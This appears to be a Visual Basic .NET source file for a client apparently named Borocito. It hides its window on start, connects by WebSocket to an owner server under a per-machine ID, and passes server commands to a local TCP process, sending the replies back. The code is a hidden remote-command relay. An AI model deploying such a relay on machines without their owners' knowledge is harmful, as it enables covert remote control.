Imports boro_comm.Boro_Comm.Cliente
Imports boro_comm.Boro_Comm.Servidor
Public Class Init
    Dim webSocket As WebSocketClient
    Dim tcpBorocito As TCPCliente

    Private Sub Init_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        CheckForIllegalCrossThreadCalls = False
        parameters = Command()
        StartUp.Init()
        ReadParameters(parameters)
        ConectarClienteWebsocket()
        ConectarClienteBorocito()
    End Sub

    Sub ConectarClienteBorocito()
        Try
            tcpBorocito = New TCPCliente("localhost", 13120)
            tcpBorocito.ConnectToServer()
            AddHandler tcpBorocito.MessageReceived, AddressOf MensajeBorocitoRecibido
        Catch ex As Exception
            AddToLog("ConectarClienteBorocito@Init", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub MensajeBorocitoRecibido(sender As Object, message As String)
        Try
            AddToLog("Borocito > Servidor", message)
            WebSocket_MessageSend(message)
        Catch ex As Exception
            AddToLog("MensajeBorocitoRecibido@Init", "Error: " & ex.Message, True)
        End Try
    End Sub

    Async Sub ConectarClienteWebsocket()
        Try
            If webSocket IsNot Nothing AndAlso webSocket.IsConnected Then
                Return
            End If

            If customWS = Nothing Then
                webSocket = New WebSocketClient(
                    "ws://" & OwnerServer & "/ws/instance/" & UID & "/",
                    UID
                )
            Else
                webSocket = New WebSocketClient(
                    "ws://" & customWS & "/ws/instance/" & UID & "/",
                    UID
                )
            End If

            AddHandler webSocket.Connected,
                AddressOf WebSocket_Connected

            AddHandler webSocket.Disconnected,
                AddressOf WebSocket_Disconnected

            AddHandler webSocket.MessageReceived,
                AddressOf WebSocket_MessageReceived

            AddHandler webSocket.ErrorOccurred,
                AddressOf WebSocket_ErrorOccurred

            Await webSocket.StartAsync()
        Catch ex As Exception
            AddToLog("ConectarClienteWebsocket@Init", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Sub WebSocket_Connected()
        AddToLog("WebSocket_Connected", "Websocket conectado")
        If Me.InvokeRequired Then
            Me.Invoke(
            Sub()
                ' change form components here
            End Sub
        )
        Else
            ' change form components here
        End If
    End Sub
    Private Sub WebSocket_Disconnected()
        AddToLog("WebSocket_Disconnected", "Websocket desconectado")
        If Me.InvokeRequired Then
            Me.Invoke(
            Sub()
                ' change form components here
            End Sub
        )
        Else
            ' change form components here
        End If
    End Sub
    Private Sub WebSocket_MessageReceived(message As ServerMessage)
        Try
            If message.Command Is Nothing Then
                Return
            End If

            AddToLog("Servidor > Borocito", message.Command)
            tcpBorocito.SendMesssage(message.Command)
        Catch ex As Exception
            AddToLog("WebSocket_MessageReceived@Init", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub WebSocket_ErrorOccurred(ex As Exception)
        AddToLog("WebSocket_ErrorOccurred", "ERROR: " & ex.Message)
    End Sub
    Private Async Sub WebSocket_MessageSend(response As String)
        AddToLog("WebSocket_MessageSend", "Respuesta enviada")
        Try
            If webSocket Is Nothing OrElse
               Not webSocket.IsConnected Then
                Return
            End If
            Dim message As New ClientMessage With {
                .Response = response
            }
            Await webSocket.SendAsync(message)
        Catch ex As Exception
        End Try
    End Sub

    Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
        Try
            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
                AddToLog("SessionEvent", "User is logging off!", True)
            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
                AddToLog("SessionEvent", "System is shutting down!", True)
            Else
                AddToLog("SessionEvent", "Something happend!", True)
            End If
        Catch ex As Exception
            AddToLog("SessionEvent@Init", "Error: " & ex.Message, True)
        End Try
    End Sub
End Class
